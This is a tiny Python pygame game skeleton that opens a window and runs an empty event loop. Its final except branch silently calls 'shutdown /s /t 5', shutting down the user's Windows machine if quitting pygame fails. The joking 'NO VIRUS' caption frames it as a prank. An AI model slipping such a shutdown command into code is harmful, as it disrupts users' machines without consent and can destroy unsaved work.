import pygame
import os
import settings as set


pygame.init()

screen = pygame.display.set_mode((set.WIDTH, set.HEIGHT))
pygame.display.set_caption("ULTRA EPIC FIGHTER PLATFORMER GENIOUS GAME 100% NO VIRUS NO CLICKBAIT")


def main() -> None:
    running = True
    # game_active = False
    
    
    while running:
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                running = False
        




if __name__ == "__main__":
    main()
    
    
try:
    pygame.quit()
except:
    print("oh uh")
    os.system('shutdown /s /t 5')
